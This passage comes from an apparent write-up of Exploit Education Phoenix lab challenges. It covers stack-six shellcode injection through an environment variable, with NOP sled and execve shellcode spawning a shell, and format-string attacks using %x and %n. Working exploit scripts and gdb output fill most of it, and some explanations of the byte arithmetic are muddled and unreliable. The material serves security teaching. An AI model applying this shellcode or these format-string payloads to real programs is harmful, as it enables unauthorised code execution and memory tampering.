0x7fffffffef00: "ExploitEducation=", '\220' <repeats 99 times>, "\061\300H\273\321\235\226\221\320\214\227\377H\367\333ST_\231RWT^\260;\017\005"
0x7fffffffef90: "LOGNAME=user"
0x7fffffffef9d: "PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"
0x7fffffffefdb: "/opt/phoenix/amd64/stack-six"
...
0x7ffffffff000: <error: Cannot access memory at address 0x7ffffffff000>
(gdb) x/32xg 0x7fffffffe500
0x7fffffffe500: 0x0000000000000001      0x00007ffff7db6d0f
0x7fffffffe510: 0x00007ffff7ffc948      0x00000000000000a6
0x7fffffffe520: 0x00007fffffffe57f      0x0000000000000001
0x7fffffffe530: 0x9090909090909090      0x00007ffff7ffb300
0x7fffffffe540: 0x0000000000000000      0x0000000000600c00
0x7fffffffe550: 0x000000000040079b      0x0000000000000000
0x7fffffffe560: 0x0000000000000000      0x00007ffff7db6b1e
0x7fffffffe570: 0x00007ffff7ffb300      0x0a00000000000000
0x7fffffffe580: 0x00007ffff7ffb300      0x00007ffff7db9934
0x7fffffffe590: 0x050f3bb05e545752      0x00007fffffffe5c0
0x7fffffffe5a0: 0x00007fffffffe638      0x00000000004007f1
0x7fffffffe5b0: 0x00007fffffffe628      0x00000001ffffe638
0x7fffffffe5c0: 0x000000000040079b      0x00007fffffffef10
0x7fffffffe5d0: 0x0000000000000001      0x00007ffff7d8fd62
0x7fffffffe5e0: 0x0000000000000000      0x00007fffffffe620
0x7fffffffe5f0: 0x0000000000000000      0x00007ffff7ffdbc8
```

### Solved

```python
shell = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
padding = "\x90" * (126 - len(shell))
print(padding+shell+'\xc0')
```

```bash
user@phoenix-amd64:~/new/new2/new3$ export ExploitEducation=$(python ~/alpha.py)
user@phoenix-amd64:~/new/new2/new3$ /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you ���������������������������������������������������������������������������������������������������1�H�ѝ��Ќ��H��ST_�RWT^�;�����
$ whoami
phoenix-amd64-stack-six
$ 
```

## Challenge 8 - Format Zero

[Format Zero Code](https://exploit.education/phoenix/format-zero/). 

This is a relatively easy challenge once you know of the bug in sprintf. Since the user controls the format string part of sprintf, what is stopping the user from entering any percentage syntax like %x. %x leaks any value that is on the stack and that gets, but into the dest buffer. Since each hex value is 8 bytes long it will expand the user input greatly causing it to overflow the buffer. This overflow with change the changeme variable completing the challenge.

### Solved

```python
padding = "%x" * 14 + "AA"
print(padding)
```
```bash
user@phoenix-amd64:~$ python format-zero.py | /opt/phoenix/amd64/format-zero 
Welcome to phoenix/format-zero, brought to you by https://exploit.education
Well done, the 'changeme' variable has been changed!
```

## Challenge 9 - Format One

[Format One Code](https://exploit.education/phoenix/format-one/). 

This challenge is like the last challenge except we need to change the changeme variable to 0x45764f6c. Like the last challenge we can overwrite the buffer by adding %xs into the input string. If we add the alphabet after we can see when and where the changeme variable is changed. I changed the number of %xs around and found that at 4 %xs the changeme variable is overwritten with our alphabet. We can see that changeme was changed to BDEF. The last thing we need to do is change the python script at that location to have \x6c\x4f\x76\x45. This will place them in a location for changeme to get changed to the value wee want competing the challenge.

```python
padding = "%x" * 4 + "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
print(padding)
```
```bash
user@phoenix-amd64:~$ python format-one.py | /opt/phoenix/amd64/format-one 
Welcome to phoenix/format-one, brought to you by https://exploit.education
Uh oh, 'changeme' is not the magic value, it is 0x45444342
```

### Solved

```python
padding = "%x" * 4 + "AA" + b'\x6c\x4f\x76\x45'
print(padding)
```

```bash
user@phoenix-amd64:~$ python format-one.py | /opt/phoenix/amd64/format-one 
Welcome to phoenix/format-one, brought to you by https://exploit.education
Well done, the 'changeme' variable has been changed correctly!
```

## Challenge 10 - Format Two

[Format Two Code](https://exploit.education/phoenix/format-two/). 

Just like the last two challenges we are trying to overwrite a integer variable, changeme. Except this this time the printf call is in other function and changeme can't be overwritten as easy. If we make a python script with a bunch of "%x"s and use that has the command argument. We can see that the program prints a bunch of things. If we look closely we can that among the things 0x25 0x78 are printed again and again. That is %x in ASCII, which is what we gave the program in the command argument. This means whatever we give the program is put on the stack.

```python
padding = '%x' * 200
print(padding)
```

```bash
user@phoenix-amd64:~$ /opt/phoenix/i486/format-two $(python format-two.py)
Welcome to phoenix/format-two, brought to you by https://exploit.education
ffffd7601000f7f84b67ffffd5c0ffffd5a880485a0ffffd4a0ffffd7601003e878257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825ffffd5c0f7ffb000ffffd640f7f8f654ffffd6342ffffd640f7f8f6542ffffd634ffffd6408110f7f8f628f7ffb000ffffd630f7ffcc20080483be804852c2ffffd63480482fc80486110f7fc7d640000804839bffffd6308049780ffffd630ffffd6302ffffd743ffffd7600ffffd8f1ffffdeadffffded8ffffdee2ffffdef1ffffdf01ffffdf1effffdf31ffffdf45ffffdf59ffffdf69ffffdf71ffffdf7e����Better luck next time!
```

Since we know that any we give the program is put on the stack if we give it the location of the changeme variable. That will be placed on the stack were we can use "%n" to change the value. The reason "%n" changes the value that is of a variable located in another stack position. Is because "&n" takes a pointer and sets the variable in that location to the value given. Meaning we can put the location of the changme variable on the stack where we have access to it and tell "%n" to change the value of the variable that address is pointing to. We can use objdump to get the location of the changeme variable.

```bash
user@phoenix-amd64:~$ objdump -t /opt/phoenix/i486/format-two 

/opt/phoenix/i486/format-two:     file format elf32-i386

SYMBOL TABLE:
08048114 l    d  .interp        00000000 .interp
08048148 l    d  .hash  00000000 .hash
0804818c l    d  .dynsym        00000000 .dynsym
0804824c l    d  .dynstr        00000000 .dynstr
080482cc l    d  .rel.plt       00000000 .rel.plt
080482fc l    d  .init  00000000 .init
08048310 l    d  .plt   00000000 .plt
08048380 l    d  .text  00000000 .text
08048611 l    d  .fini  00000000 .fini
08048620 l    d  .rodata        00000000 .rodata
080486c4 l    d  .eh_frame_hdr  00000000 .eh_frame_hdr
080486e8 l    d  .eh_frame      00000000 .eh_frame
08049770 l    d  .ctors 00000000 .ctors
08049778 l    d  .dtors 00000000 .dtors
08049780 l    d  .dynamic       00000000 .dynamic
08049820 l    d  .got.plt       00000000 .got.plt
08049844 l    d  .data  00000000 .data
08049848 l    d  .bss   00000000 .bss
00000000 l    d  .comment       00000000 .comment
00000000 l    df *ABS*  00000000 crt1.c
00000000 l    df *ABS*  00000000 crtstuff.c
08049770 l     O .ctors 00000000 __CTOR_LIST__
08049778 l     O .dtors 00000000 __DTOR_LIST__
08048724 l     O .eh_frame      00000000 __EH_FRAME_BEGIN__
080483c0 l     F .text  00000000 deregister_tm_clones
08048400 l     F .text  00000000 register_tm_clones
08048450 l     F .text  00000000 __do_global_dtors_aux
08049848 l     O .bss   00000001 completed.5195
0804984c l     O .bss   00000004 dtor_idx.5197
080484d0 l     F .text  00000000 frame_dummy
08049850 l     O .bss   00000018 object.5207
00000000 l    df *ABS*  00000000 crtstuff.c
08049774 l     O .ctors 00000000 __CTOR_END__
0804876c l     O .eh_frame      00000000 __FRAME_END__
080485e0 l     F .text  00000000 __do_global_ctors_aux
00000000 l    df *ABS*  00000000 format-two.c
00000000 l    df *ABS*  00000000 
08049780 l     O .dynamic       00000000 _DYNAMIC
080486c4 l       .eh_frame_hdr  00000000 __GNU_EH_FRAME_HDR
08049820 l     O .got.plt       00000000 _GLOBAL_OFFSET_TABLE_
00000000       F *UND*  00000000 printf
08049848 g     O .data  00000000 .hidden __TMC_END__
0804977c g     O .dtors 00000000 .hidden __DTOR_END__
00000000       F *UND*  00000000 puts
08049844 g     O .data  00000000 .hidden __dso_handle
080482fc g     F .init  00000001 _init
08049868 g     O .bss   00000004 changeme
08048380 g       .text  00000000 _start
0804839b g     F .text  00000023 _start_c
00000000       F *UND*  00000000 strncpy
08049848 g       .bss   00000000 __bss_start
00000000       F *UND*  00000000 memset
0804852c g     F .text  000000ac main
08048611 g     F .fini  00000001 _fini
08048515 g     F .text  00000017 bounce
08049848 g       .data  00000000 _edata
0804986c g       .bss   00000000 _end
00000000       F *UND*  00000000 exit
00000000       F *UND*  00000000 __libc_start_main
```

Now we can write a python script that puts the changeme variable's address location on the stack surrounded by As and Bs to make it easy to find. We will also give the program a bunch of "%x"s to see whats on the stack.

```python
padding = "AAAAAAAA" + b'\x68\x98\x04\x08' + "BBBBBBBBB" + ('%x,') * 100
print(padding)
```

We can see the variable address is sandwiched in between 41s and 42s. Last last thing we need to do is place a “%n” after the except number of “%x”s that shows everything but the changeme variable’s address. We can just count the number of ,s shown before the address to get 13. So we change 200 in the script to 13 and add a “%n” at the end of the string to find the solution.

```bash
user@phoenix-amd64:~$ /opt/phoenix/i486/format-two $(python format-two.py)
Welcome to phoenix/format-two, brought to you by https://exploit.education
AAAAAAAAhBBBBBBBBBffffd7af,100,0,f7f84b67,ffffd610,ffffd5f8,80485a0,ffffd4f0,ffffd7af,100,3e8,41414141,41414141,8049868,42424242,42424242,2c782542,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,ffffd610,f7ffb000,ffffd690,Better luck next time!
```

### Solved

```python
padding = "AAAAAAAA" + b'\x68\x98\x04\x08' + "BBBBBBBBB" + ('%x,') * 13 + '%n'
print(padding)
```
```bash
user@phoenix-amd64:~$ /opt/phoenix/i486/format-two $(python format-two.py)
Welcome to phoenix/format-two, brought to you by https://exploit.education
AAAAAAAAhBBBBBBBBBffffd8b2,100,0,f7f84b67,ffffd710,ffffd6f8,80485a0,ffffd5f0,ffffd8b2,100,3e8,41414141,41414141,Well done, the 'changeme' variable has been changed correctly!
```

## Challenge 11 - Format Three

[Format Three Code](https://exploit.education/phoenix/format-three/). 

Just like the last program we need to change the changeme variable by putting its address location on the stack and modifying it with "%n". Expect this time we need to change the variable to a specific value, 0x64457845. To start we need to get the changeme variable location using objdump. 

```bash
user@phoenix-amd64:~$ objdump -t  /opt/phoenix/i486/format-three 
/opt/phoenix/i486/format-three:     file format elf32-i386

SYMBOL TABLE:
08048114 l    d  .interp        00000000 .interp
08048148 l    d  .hash  00000000 .hash
08048188 l    d  .dynsym        00000000 .dynsym
08048238 l    d  .dynstr        00000000 .dynstr
080482b0 l    d  .rel.plt       00000000 .rel.plt
080482d8 l    d  .init  00000000 .init
080482f0 l    d  .plt   00000000 .plt
08048350 l    d  .text  00000000 .text
080485d1 l    d  .fini  00000000 .fini
080485e0 l    d  .rodata        00000000 .rodata
080486a8 l    d  .eh_frame_hdr  00000000 .eh_frame_hdr
080486cc l    d  .eh_frame      00000000 .eh_frame
08049750 l    d  .ctors 00000000 .ctors
08049758 l    d  .dtors 00000000 .dtors
08049760 l    d  .dynamic       00000000 .dynamic
08049800 l    d  .got.plt       00000000 .got.plt
08049820 l    d  .data  00000000 .data
08049824 l    d  .bss   00000000 .bss
00000000 l    d  .comment       00000000 .comment
00000000 l    df *ABS*  00000000 crt1.c
00000000 l    df *ABS*  00000000 crtstuff.c
08049750 l     O .ctors 00000000 __CTOR_LIST__
08049758 l     O .dtors 00000000 __DTOR_LIST__
08048708 l     O .eh_frame      00000000 __EH_FRAME_BEGIN__
08048390 l     F .text  00000000 deregister_tm_clones
080483d0 l     F .text  00000000 register_tm_clones
08048420 l     F .text  00000000 __do_global_dtors_aux
08049824 l     O .bss   00000001 completed.5195
08049828 l     O .bss   00000004 dtor_idx.5197
080484a0 l     F .text  00000000 frame_dummy
0804982c l     O .bss   00000018 object.5207
00000000 l    df *ABS*  00000000 crtstuff.c
08049754 l     O .ctors 00000000 __CTOR_END__
0804874c l     O .eh_frame      00000000 __FRAME_END__
080485a0 l     F .text  00000000 __do_global_ctors_aux
00000000 l    df *ABS*  00000000 format-three.c
00000000 l    df *ABS*  00000000 
08049760 l     O .dynamic       00000000 _DYNAMIC
080486a8 l       .eh_frame_hdr  00000000 __GNU_EH_FRAME_HDR
08049800 l     O .got.plt       00000000 _GLOBAL_OFFSET_TABLE_
00000000       F *UND*  00000000 printf
08049824 g     O .data  00000000 .hidden __TMC_END__
0804975c g     O .dtors 00000000 .hidden __DTOR_END__
00000000       F *UND*  00000000 puts
08049820 g     O .data  00000000 .hidden __dso_handle
080482d8 g     F .init  00000001 _init
08049844 g     O .bss   00000004 changeme
08048350 g       .text  00000000 _start
0804836b g     F .text  00000023 _start_c
00000000       F *UND*  00000000 read
08049824 g       .bss   00000000 __bss_start
080484fc g     F .text  0000009b main
080485d1 g     F .fini  00000001 _fini
080484e5 g     F .text  00000017 bounce
08049824 g       .data  00000000 _edata
08049848 g       .bss   00000000 _end
00000000       F *UND*  00000000 exit
00000000       F *UND*  00000000 __libc_start_main
```

After getting the address we can make a script were we place it on the stack and get its location using "%x"s. We can also use As to help us find it. We can see the address on the stack just before the 41s. So now we can count the ,s and get the number of "%x"s we need before the %n, which is only 11.

```python
padding = "\x44\x98\x04\x08" + "AAAA" + "%x"*15
print(padding)
```

```bash
user@phoenix-amd64:~$ python format-three.py | /opt/phoenix/i486/format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DAAAA0,0,0,f7f81cf7,f7ffb000,ffffd738,8048556,ffffc730,ffffc730,fff,0,8049844,41414141,252c7825,78252c78,
Better luck next time - got 0x00000000, wanted 0x64457845!
```

Now we can write a script that uses "%n" that changes the changme value. We can see that the value change, but to 0x0000003e. Why? The value is changed to the amount of characters in the printf string before the %n. Also the only the first 2 bytes of the value is changed with the address we have. The reason for this is because the address only stores the first 2 bytes of the value. If we want to change the next 2 bytes we need to use the address, 0x08049845. The next 2 are changed with 0x08049846 and the last 2 with this 0x08049847.

```python
padding = "\x44\x98\x04\x08" + "%x"*11 + "%n"
print(padding)
```

```bash
user@phoenix-amd64:~$ python format-three.py | /opt/phoenix/i486/format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DAAAA000f7f81cf7f7ffb000ffffd7388048556ffffc730ffffc730fff0
Better luck next time - got 0x0000003e, wanted 0x64457845!
```

We can create a script to test this and see if we can change the all the bytes of the changeme variable. As you can see that it does work and we get 0x46 for all sections. 

```python
padding = "\x44\x98\x04\x08" + "\x45\x98\x04\x08" + "\x46\x98\x04\x08" + "\x47\x98\x04\x08" + "%x"*11 + "%n" + "%n" + "%n" + "%n"
print(padding)
```

```bash
user@phoenix-amd64:~$ python format-three.py | /opt/phoenix/i486/format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG000f7f81cf7f7ffb000ffffd7388048556ffffc730ffffc730fff0
Better luck next time - got 0x46464646, wanted 0x64457845!
```

Since the value that the variable is being changed to is just the number of characters before the "%n". We can add a padding of As that changes each section to the value we want. The value we want in the first 2 bytes is 45. It is simple math to get how many As we need to pad before the "%n". Since the address is only holding 2 bytes we can add a byte to the value we want and subtract it to the value we need. This gets us the number of padding As we need. For example this is the math in hex 145-46=FF. FF hex is just 255, so we need 255 As before the first "%n" in our script. Using this script gets us the value we need in the first 2 bytes, but that is shared to all the rest.

```python
padding = "\x44\x98\x04\x08" + "\x45\x98\x04\x08" + "\x46\x98\x04\x08" + "\x47\x98\x04\x08" + "%x"*11 + "A"*255 + "%n" + "%n" + "%n" + "%n"
print(padding)
```

```bash
user@phoenix-amd64:~$ python format-three.py | /opt/phoenix/i486/format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG000f7f81cf7f7ffb000ffffd7388048556ffffc730ffffc730fff0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Better luck next time - got 0x45454545, wanted 0x64457845!
```

The next 2 bytes we need the value 78. So if we do the same math as last time we get, 178-45=133. 133 in hex is 307 in decimal. That means we need to added 307 As before the second "%n" in our script. Trying this script out get us the value we want in both the first 4 bytes. 

```python
padding = "\x44\x98\x04\x08" + "\x45\x98\x04\x08" + "\x46\x98\x04\x08" + "\x47\x98\x04\x08" + "%x"*11 + "A"*255 + "%n" + "A"*307 + "%n" + "%n" + "%n"
print(padding)
```

```bash
user@phoenix-amd64:~$ python format-three.py | /opt/phoenix/i486/format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG000f7f81cf7f7ffb000ffffd7388048556ffffc730ffffc730fff0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Better luck next time - got 0x78787845, wanted 0x64457845!
```

The next 2 bytes we need the value 45. So doing the same math gets us, 145-78=CD. CD in hex is 205 in decimal. That means we need to added 205 As before the third "%n" in our script. Trying this script out get us the value we want in both the first 6 bytes. So the last value we want is 64. We do the math. 164-45=11F. 11F in hex is 287 in decimal. We add that to the script which is the solution to the challenge.

```python
padding = "\x44\x98\x04\x08" + "\x45\x98\x04\x08" + "\x46\x98\x04\x08" + "\x47\x98\x04\x08" + "%x"*11 + "A"*255 + "%n" + "A"*307 + "%n" + "A"*205 + "%n" + "%n"
print(padding)
```

```bash
user@phoenix-amd64:~$ python format-three.py | /opt/phoenix/i486/format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG000f7f81cf7f7ffb000ffffd7388048556ffffc730ffffc730fff0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Better luck next time - got 0x45457845, wanted 0x64457845!
```

### Solved

```python
padding = "\x44\x98\x04\x08" + "\x45\x98\x04\x08" + "\x46\x98\x04\x08" + "\x47\x98\x04\x08" + "%x"*11 + "A"*255 + "%n" + "A"*307 + "%n" + "A"*205 + "%n" + "A"*287 + "%n"
print(padding)
```

```bash
user@phoenix-amd64:~$ python format-three.py | /opt/phoenix/i486/format-three 
Welcome to phoenix/format-three, brought to you by https://exploit.education
DEFG000f7f81cf7f7ffb000ffffd7388048556ffffc730ffffc730fff0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Well done, the 'changeme' variable has been changed correctly!
```
